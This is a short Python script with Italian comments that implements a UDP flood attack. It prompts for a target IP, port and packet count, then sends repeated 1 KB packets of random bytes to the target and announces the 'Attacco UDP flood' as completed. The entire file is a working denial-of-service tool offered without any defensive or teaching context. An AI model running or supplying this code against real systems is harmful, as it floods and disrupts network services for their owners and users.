import socket
import random

# Richiesta input all'utente
target_ip = input("Inserisci l'IP della macchina target: ")
target_port = int(input("Inserisci la porta UDP della macchina target: "))
num_packets = int(input("Quanti pacchetti da 1KB vuoi inviare? "))

# Creazione del socket UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Costruzione del pacchetto da 1KB (1024 byte)
data = random._urandom(1024)  # byte casuali

print(f"\nInizio invio di {num_packets} pacchetti da 1KB verso {target_ip}:{target_port}...\n")

# Invio dei pacchetti
for i in range(num_packets):
    sock.sendto(data, (target_ip, target_port))
    print(f"Pacchetto {i+1} inviato")

print("\nAttacco UDP flood completato.")
